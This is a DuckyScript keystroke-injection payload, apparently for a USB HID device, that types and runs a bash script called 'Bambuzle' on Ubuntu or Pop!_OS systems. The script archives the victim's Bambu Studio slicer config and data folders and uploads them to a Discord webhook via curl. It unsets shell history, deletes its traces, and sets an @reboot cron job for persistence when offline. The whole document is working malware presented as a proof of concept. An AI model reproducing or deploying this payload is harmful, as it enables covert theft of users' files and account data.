REM TITLE: Bambuzle
REM AUTHOR: https://github.com/OSINTI4L
REM TARGET OS: Pop!_OS 22.04 | Ubuntu 22.04.5 | Bambu Studio slicer software (Bambu_Studio_ubuntu-22.04_PR-8583.AppImage)
REM DESCRIPTION: A hot plug injection method for delivering the Bambuzle Linux malware PoC, see README.md

REM Define webhook:
DEFINE #WEBHOOK https://discord.com/api/webhooks/INSERT_WEBHOOK_HERE

REM Begin attack:
ATTACKMODE HID
DELAY 1000

REM Opening terminal:
CTRL ALT t
DELAY 300

REM Unsetting terminal history and building "Bambuzle.sh":
STRINGLN unset HISTFILE
STRINGLN cat > Bambuzle.sh
STRINGLN_BASH
#!/bin/bash
#Bambuzle
Webhook="#WEBHOOK"
# Define $USER var due to environmental issues in cron:
user="$(whoami)"
# Internet connectivity check:
net_check() {
    ping -c 1 discord.com >/dev/null 2>&1
}
# Config file check 1:
configfilecheck() {
    find /home/$user/.config -name "BambuStudio" | grep . >/dev/null 2>&1
}
# Config file check 2:
localfilecheck() {
    find /home/$user/.local/share -name "bambu-studio" | grep . >/dev/null 2>&1
}

# If internet connected and files present, tarball and exfil, else hide and embed payload as cronjob:
if net_check && configfilecheck && localfilecheck; then
# Creating tarball of config files:
tar -czf /home/$user/.Bambuzle.tar.gz --exclude "plugins" /home/$user/.config/BambuStudio /home/$user/.local/share/bambu-studio > /dev/null 2>&1
# Exfil to Discord:
curl -s -X POST -H "Content-Type: multipart/form-data" \
-F "file=@/home/$user/.Bambuzle.tar.gz" \
-F "content=$ Loot Incoming $" \
"$Webhook" > /dev/null 2>&1
# Obfuscation phase
# Remove tarball locally:
rm /home/$user/.Bambuzle.tar.gz
# Remove cronjob (if present):
crontab -l 2>/dev/null | grep -v '.Bambuzle.sh' | crontab -
# Self-destruct payload:
rm -- "$0"
elif
# Confirm if payload has already been moved and hidden if conditions not met:
find /home/$user/ -name ".Bambuzle.sh" | grep . >/dev/null 2>&1; then
exit 0
else
# If not, hide and embed to cron to be ran on boot:
mv -- "$0" /home/$user/.Bambuzle.sh
crontab -l > .crontemp; echo "@reboot sleep 60 && /home/$user/.Bambuzle.sh" >> .crontemp; crontab .crontemp; rm -f .crontemp
fi
END_STRINGLN
CTRL c

REM Granting perms, executing payload, and exiting:
STRINGLN chmod +x Bambuzle.sh && ./Bambuzle.sh && exit
